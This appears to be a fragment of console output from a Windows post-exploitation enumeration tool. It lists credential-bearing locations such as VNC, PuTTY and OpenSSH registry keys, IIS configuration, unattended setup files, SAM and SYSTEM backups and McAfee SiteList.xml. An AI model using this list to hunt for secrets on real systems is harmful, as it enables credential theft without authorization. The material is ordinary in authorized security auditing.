                                                                                                                                                                      
Looking inside HKCU\Software\TightVNC\Server                                                                                                                          
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                                                                               
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                                                                       
C:\Windows\Panther\setupinfo                                                                                                                                          
C:\Windows\System32\inetsrv\appcmd.exe                                                                                                                                
C:\Windows\winsxs\x86_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7600.16385_none_10bfc8e81625ecbd\appcmd.exe                                          
C:\inetpub\temp\appPools\Web.config                                                                                                                                   
                                                                                                                                                                      
---                                                                                                                                                                   
Scan complete.                                                                                                                                                        
                                                                                                                                                                      
 [+] Unattended files                                                                                                                                                 
                                                                                                                                                                      
 [+] SAM and SYSTEM backups                                                                                                                                           
                                                                                                                                                                      
 [+] McAffee SiteList.xml                                                                                                                                             
 Volume in drive C has no label.                                                                                                                                      
 Volume Serial Number is 8620-71F1                                                                                                                                    
C:\Program Files                                                                                                                                                      
 Volume in drive C has no label.                                                                                                                                      
 Volume Serial Number is 8620-71F1                                                                                                                                    
 Volume in drive C has no label.                                                                                                  
